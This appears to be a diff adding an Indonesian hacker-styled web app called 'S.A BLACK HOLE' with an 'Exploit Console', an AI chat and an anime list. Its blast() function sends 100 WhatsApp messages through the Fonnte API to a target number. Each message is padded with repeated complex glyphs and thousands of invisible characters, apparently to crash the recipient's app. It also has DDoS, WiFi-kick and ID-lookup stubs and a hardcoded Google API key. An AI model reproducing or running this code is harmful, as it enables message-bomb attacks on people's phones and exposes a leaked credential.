@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>S.A BLACK HOLE v6.0 | ULTIMATE</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Plus+Jakarta+Sans:wght@500;700&display=swap');
+        :root { --pink: #ff2d78; --bg: #050505; }
+        body { background-color: var(--bg); color: white; font-family: 'Orbitron', sans-serif; height: 100dvh; overflow: hidden; margin: 0; }
+        
+        #preloader { position: fixed; inset: 0; background: var(--bg); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 10000; }
+        .cyber-progress { width: 0%; height: 2px; background: var(--pink); box-shadow: 0 0 10px var(--pink); animation: load 3s forwards; }
+        @keyframes load { to { width: 200px; } }
+
+        .page { position: absolute; inset: 0; display: none; padding: 15px; flex-direction: column; overflow-y: auto; padding-bottom: 90px; }
+        .active-page { display: flex; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .glass { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 20px; padding: 15px; }
+        .btn-main { background: linear-gradient(90deg, #ff2d78, #b30047); border-radius: 12px; padding: 15px; font-weight: 900; width: 100%; text-transform: uppercase; }
+        
+        /* BUBBLE CHAT AI */
+        .chat-container { display: flex; flex-direction: column; gap: 12px; font-family: 'Plus Jakarta Sans'; }
+        .bubble { max-width: 85%; padding: 12px 16px; border-radius: 20px; font-size: 13px; line-height: 1.5; }
+        .user-bubble { align-self: flex-end; background: var(--pink); border-bottom-right-radius: 2px; box-shadow: 0 4px 15px rgba(255,45,120,0.3); }
+        .ai-bubble { align-self: flex-start; background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.1); border-bottom-left-radius: 2px; }
+
+        input { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); padding: 14px; border-radius: 12px; color: white; width: 100%; font-family: 'Plus Jakarta Sans'; font-size: 12px; }
+        
+        nav { position: fixed; bottom: 0; left: 0; right: 0; height: 75px; background: #000; border-top: 1px solid rgba(255,255,255,0.1); display: flex; justify-content: space-around; align-items: center; z-index: 1000; }
+        .nav-link { color: #444; display: flex; flex-direction: column; align-items: center; gap: 4px; font-size: 16px; }
+        .nav-link.active { color: var(--pink); }
+        .nav-link span { font-size: 8px; font-weight: 900; }
+
+        .list-item { background: rgba(255, 255, 255, 0.03); border-radius: 12px; padding: 12px; margin-bottom: 8px; border: 1px solid transparent; }
+        .list-item.selected { border-color: var(--pink); background: rgba(255, 45, 120, 0.1); }
+        .gif-box { width: 100%; h: 140px; border-radius: 15px; overflow: hidden; border: 1px solid var(--pink); margin-bottom: 15px; }
+    </style>
+</head>
+<body onload="initLoader()">
+
+    <div id="preloader">
+        <h1 class="text-xl font-black italic tracking-widest">S.A <span class="text-pink-600">PROJECT</span></h1>
+        <div class="mt-4 h-[2px] w-[200px] bg-white/10"><div class="cyber-progress"></div></div>
+    </div>
+
+    <div id="loginPage" class="page justify-center items-center">
+        <h1 class="text-3xl font-black mb-8 uppercase text-pink-500">BLACK HOLE</h1>
+        <div class="w-full max-w-xs space-y-4">
+            <input id="userIn" type="text" placeholder="ADMIN USERNAME" class="text-center">
+            <input id="tokenIn" type="password" placeholder="YOUR TOKEN" class="text-center">
+            <button onclick="login()" class="btn-main">AUTHORIZE SYSTEM</button>
+        </div>
+    </div>
+
+    <div id="homePage" class="page">
+        <div class="gif-box"><img src="https://i.ibb.co.com/bRqDgJPZ/GIF-20251215-115618-144.gif" class="w-full h-full object-cover"></div>
+        <div class="mb-6 px-1">
+            <h2 id="dispUser" class="text-2xl font-black italic">SURYA</h2>
+            <p class="text-[9px] text-pink-500 font-black tracking-widest uppercase">Global Control Center • v6.0</p>
+        </div>
+        
+        <div class="grid grid-cols-2 gap-3 mb-4">
+            <div class="glass"><p class="text-[8px] text-gray-500">NETWORK</p><p class="text-xs font-bold text-green-500">ENCRYPTED</p></div>
+            <div class="glass"><p class="text-[8px] text-gray-500">STORAGE</p><p class="text-xs font-bold">124GB / 256GB</p></div>
+        </div>
+
+        <div class="glass mb-4">
+            <p class="text-[9px] text-gray-500 font-black mb-3 uppercase tracking-widest">System Health</p>
+            <div class="space-y-3">
+                <div class="w-full bg-white/5 h-1 rounded-full overflow-hidden"><div class="bg-pink-600 h-full" style="width: 75%"></div></div>
+                <div class="flex justify-between text-[9px] font-mono"><span>DATABASE REPLICATION</span><span class="text-pink-500">STABLE</span></div>
+                <div class="flex justify-between text-[9px] font-mono"><span>CORE TEMPERATURE</span><span class="text-pink-500">38°C</span></div>
+            </div>
+        </div>
+
+        <div class="glass flex-1 overflow-hidden">
+            <p class="text-[9px] text-gray-500 font-black mb-2 uppercase">Live Activity Logs</p>
+            <div id="logHome" class="font-mono text-[8px] text-pink-500/60 space-y-1">
+                <p>> Initializing SA Link...</p>
+                <p>> System authorized by Surya.</p>
+                <p>> Scanning local networks...</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="toolsMenuPage" class="page">
+        <h2 class="text-xl font-black mb-6 uppercase text-pink-500 italic">Exploit Console</h2>
+        <div class="grid grid-cols-2 gap-4">
+            <div class="glass flex flex-col items-center py-6" onclick="nav('bugPage')"><i class="fas fa-skull text-2xl text-pink-500 mb-2"></i><p class="text-[10px] font-black">BUG WHATSAPP</p></div>
+            <div class="glass flex flex-col items-center py-6" onclick="nav('wifiPage')"><i class="fas fa-wifi text-2xl text-pink-500 mb-2"></i><p class="text-[10px] font-black">WIFI KILLER</p></div>
+            <div class="glass flex flex-col items-center py-6" onclick="nav('ddosPage')"><i class="fas fa-network-wired text-2xl text-pink-500 mb-2"></i><p class="text-[10px] font-black">DDOS ATTACK</p></div>
+            <div class="glass flex flex-col items-center py-6" onclick="nav('nikPage')"><i class="fas fa-id-card text-2xl text-pink-500 mb-2"></i><p class="text-[10px] font-black">NIK CHECKER</p></div>
+        </div>
+    </div>
+
+    <div id="bugPage" class="page">
+        <button onclick="nav('toolsMenuPage')" class="mb-4 text-pink-500 font-black text-[10px] italic"><i class="fas fa-arrow-left"></i> BACK</button>
+        <div class="gif-box"><img src="https://i.ibb.co.com/bRqDgJPZ/GIF-20251215-115618-144.gif" class="w-full h-full object-cover"></div>
+        <input id="targetNum" type="number" placeholder="Target 628xxx" class="mb-4">
+        <div class="space-y-2 mb-4">
+            <div class="list-item selected" onclick="selBug(this)"><p class="text-[10px] font-black uppercase">System Crash Payload</p></div>
+            <div class="list-item" onclick="selBug(this)"><p class="text-[10px] font-black uppercase">RAM Overflow Binary</p></div>
+        </div>
+        <button onclick="blast(100)" class="btn-main italic">Execute Blast</button>
+        <div id="waLog" class="mt-4 font-mono text-[8px] text-pink-500/50 h-24 overflow-y-auto"></div>
+    </div>
+
+    <div id="wifiPage" class="page"><button onclick="nav('toolsMenuPage')" class="mb-4 text-pink-500 font-black text-xs">BACK</button><h2 class="text-xl font-black uppercase">WIFI KILLER</h2><input type="text" placeholder="MAC ADDR"><button class="btn-main mt-4">KICK</button></div>
+    <div id="ddosPage" class="page"><button onclick="nav('toolsMenuPage')" class="mb-4 text-pink-500 font-black text-xs">BACK</button><h2 class="text-xl font-black uppercase">DDOS WEB</h2><input type="text" placeholder="TARGET URL"><button class="btn-main mt-4">FLOOD</button></div>
+    <div id="nikPage" class="page"><button onclick="nav('toolsMenuPage')" class="mb-4 text-pink-500 font-black text-xs">BACK</button><h2 class="text-xl font-black uppercase">NIK CHECKER</h2><input type="number" placeholder="NIK 320..."><button class="btn-main mt-4">CHECK</button></div>
+
+    <div id="animePage" class="page">
+        <h2 class="text-xl font-black mb-6 uppercase text-pink-500 italic">Trending Anime</h2>
+        <div id="animeCont" class="space-y-3"></div>
+    </div>
+
+    <div id="aiPage" class="page">
+        <h2 class="text-xl font-black mb-4 uppercase text-pink-500 italic">AI CHAT</h2>
+        <div id="chatBox" class="flex-1 overflow-y-auto chat-container pr-2">
+            <div class="bubble ai-bubble italic">Sistem Aktif. Ada perintah, Boss Surya?</div>
+        </div>
+        <div class="flex gap-2 mt-4 bg-white/5 p-2 rounded-2xl border border-white/10">
+            <input id="aiIn" type="text" placeholder="Type command..." class="!bg-transparent !border-none">
+            <button onclick="chatAI()" class="w-12 h-12 bg-pink-600 rounded-xl flex items-center justify-center shrink-0 shadow-lg"><i class="fas fa-paper-plane text-xs"></i></button>
+        </div>
+    </div>
+
+    <nav id="navbar" class="hidden">
+        <button onclick="nav('homePage')" class="nav-link active"><i class="fas fa-home"></i><span>Home</span></button>
+        <button onclick="nav('toolsMenuPage')" class="nav-link"><i class="fas fa-tools"></i><span>Tools</span></button>
+        <button onclick="nav('animePage')" class="nav-link"><i class="fas fa-play"></i><span>Anime</span></button>
+        <button onclick="nav('aiPage')" class="nav-link"><i class="fas fa-brain"></i><span>AI Chat</span></button>
+    </nav>
+
+    <script>
+        const GEMINI_KEY = "AIzaSyA0gJtfLcZkweAm9ckpz5w5m1UxfrBPp4Y";
+        let FONNTE_TOKEN = "";
+
+        function initLoader() {
+            setTimeout(() => {
+                document.getElementById('preloader').style.display = 'none';
+                document.getElementById('loginPage').classList.add('active-page');
+            }, 3000);
+        }
+
+        function login() {
+            const u = document.getElementById('userIn').value;
+            const t = document.getElementById('tokenIn').value;
+            if(!u || !t) return alert("Credentials Required!");
+            FONNTE_TOKEN = t;
+            document.getElementById('dispUser').innerText = u.toUpperCase();
+            document.getElementById('loginPage').classList.remove('active-page');
+            document.getElementById('navbar').classList.remove('hidden');
+            nav('homePage');
+            loadAnime();
+        }
+
+        function nav(id) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
+            document.getElementById(id).classList.add('active-page');
+            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+            const map = {homePage:0, toolsMenuPage:1, animePage:2, aiPage:3};
+            if(map[id] !== undefined) document.querySelectorAll('.nav-link')[map[id]].classList.add('active');
+        }
+
+        function selBug(el) {
+            document.querySelectorAll('.list-item').forEach(i => i.classList.remove('selected'));
+            el.classList.add('selected');
+        }
+
+        async function blast(rep) {
+            const t = document.getElementById('targetNum').value;
+            const log = document.getElementById('waLog');
+            if(!t) return alert("Target Error!");
+            log.innerHTML = "";
+            const payload = `〔 𝐒.𝐀 𝐁𝐋𝐀𝐂𝐊 𝐇𝐎𝐋𝐄 〕\n\n${"జ్ఞา".repeat(15)}\n${"‌".repeat(4000)}`;
+            for(let i=1; i<=rep; i++) {
+                fetch('https://api.fonnte.com/send', {method:'POST', headers:{'Authorization':FONNTE_TOKEN}, body:new URLSearchParams({'target':t, 'message':payload+" ["+i+"]"})});
+                log.innerHTML += `<p>> Packet ${i} Injected...</p>`;
+                log.scrollTop = log.scrollHeight;
+                await new Promise(r => setTimeout(r, 600));
+            }
+        }
+
+        async function chatAI() {
+            const input = document.getElementById('aiIn').value;
+            const box = document.getElementById('chatBox');
+            if(!input) return;
+            box.innerHTML += `<div class="bubble user-bubble">${input}</div>`;
+            document.getElementById('aiIn').value = "";
+            box.scrollTop = box.scrollHeight;
+            try {
+                const res = await fetch("https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key="+GEMINI_KEY, {
+                    method: "POST", headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ "contents": [{ "parts": [{ "text": input }] }] })
+                });
+                const data = await res.json();
+                box.innerHTML += `<div class="bubble ai-bubble">${data.candidates[0].content.parts[0].text}</div>`;
+            } catch (e) { box.innerHTML += `<div class="bubble ai-bubble">Error: Neural Link Broken.</div>`; }
+            box.scrollTop = box.scrollHeight;
+        }
+
+        async function loadAnime() {
+            try {
+                const res = await fetch('https://api.jikan.moe/v4/top/anime?limit=10');
+                const {data} = await res.json();
+                document.getElementById('animeCont').innerHTML = data.map(a => `
+                    <div class="glass flex gap-4 p-2 items-center">
+                        <img src="${a.images.jpg.image_url}" class="w-14 h-14 rounded-lg object-cover">
+                        <div class="overflow-hidden">
+                            <p class="text-[10px] font-black truncate">${a.title}</p>
+                            <p class="text-[8px] text-pink-500 uppercase">${a.type} • Score ${a.score}</p>
+                        </div>
+                    </div>
+                `).join('');
+            } catch(e) {}
+        }
+    </script>
+</body>
+</html>
